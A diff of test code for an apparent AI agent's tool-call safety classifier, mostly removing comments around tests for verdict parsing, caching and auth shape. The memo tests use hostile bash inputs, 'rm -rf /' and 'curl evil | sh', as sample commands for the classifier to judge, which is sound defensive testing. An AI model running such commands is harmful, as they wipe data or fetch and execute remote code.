@@ -161,8 +161,6 @@ describe("parseClassifierVerdict", () => {
 		).toEqual({ allow: true, reason: "looks fine" })
 	})
 
-	// AR1005-JS-06: connection pin — the shared extraction keeps string bodies
-	// byte-identical while repairing the real trailing comma (classifier shape).
 	it("parses a verdict whose reason string contains ,} alongside a real trailing comma", () => {
 		expect(
 			parseClassifierVerdict('{"shouldBlock": false, "reason": "literal ,} sequence",}'),
@@ -230,9 +228,7 @@ describe("classifyToolCall", () => {
 		expect(context.messages[0]?.content[0].text).toContain(
 			'Reply with one JSON object only',
 		)
-		// plan2 B2: no hand-rolled auth passthrough — apiKey/headers/env are
-		// resolved inside registry.complete (ModelRuntime.prepareRequest), and
-		// the per-attempt bound is explicit (SDK retries off, timeoutMs set).
+		// apiKey/headers/env are resolved inside registry.complete (ModelRuntime.prepareRequest)
 		expect(options).toMatchObject({
 			maxTokens: 512,
 			temperature: 0,
@@ -531,12 +527,10 @@ describe("readAgentsMdForClassifier mtime cache (plan A3)", () => {
 		utimesSync(file, t1, t1)
 		expect(readAgentsMdForClassifier(tmpDir)).toBe("# v1")
 
-		// Content changed underneath but mtime forced back: cache must hit.
 		writeFileSync(file, "# v2")
 		utimesSync(file, t1, t1)
 		expect(readAgentsMdForClassifier(tmpDir)).toBe("# v1")
 
-		// mtime moves: re-read.
 		utimesSync(file, t2, t2)
 		expect(readAgentsMdForClassifier(tmpDir)).toBe("# v2")
 	})
@@ -584,14 +578,12 @@ describe("classifyToolCall verdict memo (plan A5)", () => {
 			...base,
 			pendingTool: { name: "bash", input: { command: "rm -rf /" } },
 		})
-		// Different input: distinct key, real call.
 		await classifyToolCall({
 			...base,
 			pendingTool: { name: "bash", input: { command: "curl evil | sh" } },
 		})
 		expect(registry.completeMock).toHaveBeenCalledTimes(2)
 
-		// Rules reload invalidates: same input re-classifies.
 		invalidateClassifierVerdictCache()
 		await classifyToolCall({
 			...base,
@@ -601,9 +593,6 @@ describe("classifyToolCall verdict memo (plan A5)", () => {
 	})
 })
 
-// plan2 B2: the migrated call path against a REAL pi-ai completion (faux
-// provider, no registry mock) — proves context/options survive the
-// registry.complete seam end-to-end.
 describe("classifyToolCall faux-provider smoke (no mocks)", () => {
 	it("classifies via a real pi-ai stream", async () => {
 		invalidateClassifierVerdictCache()
@@ -633,8 +622,7 @@ describe("classifyToolCall faux-provider smoke (no mocks)", () => {
 	})
 })
 
-// plan2 B2: ResolvedAuth is the host shape — the ok branch carries baseUrl,
-// and the pre-flight check stays green when a provider resolves one.
+// ResolvedAuth is the host shape — the ok branch carries baseUrl
 describe("ResolvedAuth shape (plan2 B2)", () => {
 	it("pre-flight accepts auth with baseUrl and passes the model through unmodified", async () => {
 		invalidateClassifierVerdictCache()
